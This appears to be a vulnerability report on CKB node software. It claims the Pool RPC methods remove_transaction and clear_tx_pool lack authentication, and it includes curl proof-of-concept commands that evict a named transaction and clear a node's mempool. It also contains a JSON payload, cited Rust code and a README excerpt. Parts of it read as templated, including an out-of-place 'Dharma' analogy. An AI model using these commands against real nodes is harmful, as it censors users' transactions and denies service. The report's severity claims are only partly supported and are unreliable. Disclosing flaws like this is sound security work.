### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPC Methods Allow Any Caller to Evict Arbitrary Transactions from the Pool — (`rpc/src/module/pool.rs`)

### Summary

The `Pool` RPC module, enabled by default in production CKB nodes, exposes `remove_transaction` and `clear_tx_pool` with no authentication or authorization check of any kind. Any caller who can reach the RPC endpoint — including remote callers on nodes that expose the port — can silently evict any specific pending transaction or wipe the entire mempool. This is a direct analog to the Dharma `mint`-without-authorization bug: a state-mutating operation that should be restricted to the node operator is publicly callable by an unprivileged RPC caller.

### Finding Description

**Root cause — `remove_transaction`**

`PoolRpcImpl::remove_transaction` in `rpc/src/module/pool.rs` accepts a transaction hash and unconditionally forwards it to `tx_pool.remove_local_tx`. There is no caller identity check, no API key, no HTTP Basic Auth enforcement, and no rate limit. [1](#0-0) 

The trait declaration exposes it as a plain public RPC method: [2](#0-1) 

**Root cause — `clear_tx_pool`**

`PoolRpcImpl::clear_tx_pool` wipes the entire mempool in one call, again with zero authorization: [3](#0-2) 

**`Pool` module is enabled by default in production**

The shipped `ckb.toml` template includes `Pool` in the default module list: [4](#0-3) 

The RPC server's `ServiceBuilder` mounts all `Pool` methods whenever `pool_enable()` returns `true`, with no additional guard: [5](#0-4) 

**No server-side authentication exists**

The RPC server has no HTTP Basic Auth enforcement layer. The `parse_authorization` helper in the miner *client* only adds an `Authorization` header when the miner connects outward; the server never validates it. Any HTTP POST to the RPC port is accepted and dispatched. [6](#0-5) 

**Exploit path**

1. Attacker identifies a high-value pending transaction hash (visible via `get_raw_tx_pool`, also unauthenticated).
2. Attacker sends:
   ```json
   {"jsonrpc":"2.0","method":"remove_transaction","params":["<target_tx_hash>"],"id":1}
   ```
   to the node's RPC port.
3. The transaction and all its dependents are silently dropped from the pool.
4. Repeat for every resubmission, or use `clear_tx_pool` to wipe the entire pool in one shot.

### Impact Explanation

- **Targeted transaction censorship**: An attacker can prevent any specific transaction from ever being confirmed on a node by continuously removing it whenever it is resubmitted. This is the direct CKB analog to the Dharma "front-run the issuance hash" attack: the attacker does not need to win a race condition — they simply delete the victim's entry after it appears.
- **Full mempool wipe**: `clear_tx_pool` drops every pending transaction simultaneously, causing all unconfirmed transactions on that node to be lost. Users must resubmit; the attacker can loop the call to sustain the denial of service.
- **No funds required, no PoW required**: The attack costs only an HTTP request.

### Likelihood Explanation

The `Pool` module is on by default. Many CKB node operators expose the RPC port to the internet to serve dApps and wallets (the documentation warns against this but does not enforce it). Even on localhost-only nodes, any co-located process or web application with SSRF capability can reach port 8114. The `remove_transaction` and `clear_tx_pool` methods are documented publicly in the RPC README, making them trivially discoverable. [7](#0-6) [8](#0-7) 

### Recommendation

Add an authorization layer to all state-mutating Pool RPC methods (`remove_transaction`, `clear_tx_pool`, `clear_tx_verify_queue`). Options in increasing strength:

1. **HTTP Basic Auth enforcement at the server level** — validate a configured token/password before dispatching any mutating method.
2. **Separate the destructive methods into a restricted sub-module** (analogous to how `IntegrationTest` is gated behind a separate module flag and a Dummy-PoW assertion), so operators must explicitly opt in.
3. **Remove `remove_transaction` and `clear_tx_pool` from the default `Pool` module** and require explicit opt-in configuration, with a prominent warning.

The `IntegrationTest` module correctly demonstrates the pattern: it is not in the default module list and additionally asserts `Pow::Dummy` before mounting its methods. [9](#0-8) 

### Proof of Concept

```bash
# Step 1: observe a pending transaction
curl -s http://127.0.0.1:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'

# Step 2: remove it (no credentials required)
TX_HASH="0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"
curl -s http://127.0.0.1:8114 -H 'Content-Type: application/json' \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"remove_transaction\",\"params\":[\"$TX_HASH\"],\"id\":2}"
# Returns: {"jsonrpc":"2.0","result":true,"id":2}

# Step 3: wipe the entire pool
curl -s http://127.0.0.1:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
# Returns: {"jsonrpc":"2.0","result":null,"id":3}
```

Both calls succeed with no authentication on a default-configured CKB node.

fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}

#### Method `remove_transaction`
* `remove_transaction(tx_hash)`
    * `tx_hash`: [`H256`](#type-h256)
* result: `boolean`

Removes a transaction and all transactions which depends on it from tx pool if it exists.

###### Params

* `tx_hash` - Hash of a transaction.

###### Returns

If the transaction exists, return true; otherwise, return false.

###### Examples

Request

```json
{
  "id": 42,
  "jsonrpc": "2.0",
  "method": "remove_transaction",
  "params": [
    "0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"
  ]
}
```

}
